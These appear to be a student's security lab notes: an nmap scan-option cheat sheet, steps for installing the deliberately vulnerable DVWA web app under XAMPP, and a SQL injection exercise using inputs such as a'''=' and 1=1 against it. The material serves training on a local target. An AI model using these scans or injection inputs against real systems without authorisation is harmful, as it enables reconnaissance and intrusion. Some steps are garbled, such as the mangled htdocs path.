nmap -sn <target> 
	- Perform a ping scan to discover live hosts on the network.

nmap -sT <target> 
	- Perform a TCP connect scan, which establishes a full TCP connection to each port to determine its state.

nmap -sS <target> 
	- Perform a SYN scan, also known as stealth scan, by sending SYN packets to each port and analyzing responses to determine open ports.

nmap -sU <target> 
	- Perform a UDP scan to find open UDP ports on the target.

nmap -O <target> 
	- Perform OS detection against the target to determine the operating system running on the host.

nmap -A <target> 
	- Aggressive scan options including OS detection, version detection, script scanning, and traceroute.

nmap -p- <target> 
	- Scan all 65,535 TCP ports on the target.

nmap -F <target> 
	- Scan only the most common 100 ports on the target.

nmap -sV <target> 
	- Probe open ports to determine service and version information.

nmap -v <target> 
	- Increase verbosity level to get more detailed output during the scan.

nmap -oA <output_prefix> <target> 
	- Output scan results in three formats: normal, XML, and grepable.

nmap -T4 <target> 
	- Set timing template to aggressive, increasing scan speed at the cost of reliability.

nmap -PN <target> 
	- Treat all hosts as online, skipping host discovery.

nmap --script vuln <target> 
	- Run NSE scripts to detect known vulnerabilities on the target.

nmap --traceroute <target> 
	- Perform traceroute to the target host to discover the path packets take.

nmap -sX <target> 
	- Perform Xmas tree scan, setting FIN, URG, and PUSH flags to probe for open ports.

nmap -sN <target> 
	- Perform Null scan, sending packets with no TCP flag set to identify open ports.

nmap -sF <target> 
	- Perform FIN scan, sending packets with only the FIN flag set to detect open ports.

nmap -sP <target> 
	- Perform a ping scan to determine which hosts are online without scanning ports.

nmap -sL <targets_file> - List scan, simply list targets to scan without performing any actual scanning.



 Download xampp and install it from here : https://downloadsapachefriends.global...
   after install xampp open xampp control panel and start two services : Apache and Mysql
   (I have already installed it.. )
   
2) Download DVWA(DAMN VULNERABLE WEB APP) from its official site.
3) Extract the folder and rename it to "dvwa"
4) Copy that folder into C:xampp:htdocs: paste here.
5) Now open dvwa folder then open config folder under that make a copy of config.inc.php.dist
6) Then rename it to config.inc.php
7) Open it with any text editor and remove the password.
8)Now go to the localhost/dvwa/ Then in the bottom click create database button.
9) Wait a second you will be redirected to login page.
10) Now enter the login ID and password as  admin/password.
11) After successful login click the fourth last option and set the security level to low.
12) Then click on XSS(stored) and type any name and type the script that you want to inject.


AIM: Perform SQL injection attack.

Step 1 : Open XAMPP and start apache and mysql.
Step 2 : Go to web browser and enter site localhost/phpmyadmin.
Step 3 : Create database with name sql_db.
Step 4 : Go to site localhost/dvwa/ then login.
Step 5 : Go to security setting option in left and set security level low.
Step 6 : Click on SQL injection option in left.
Step 7 : Write "1" in text box and click on submit.
Step 8 : Write a'''=' in text box and click on submit.
Step 9 : Write "1=1" in text box and click on submit.
Step 10 : Write "1*" in text box and click on submit.
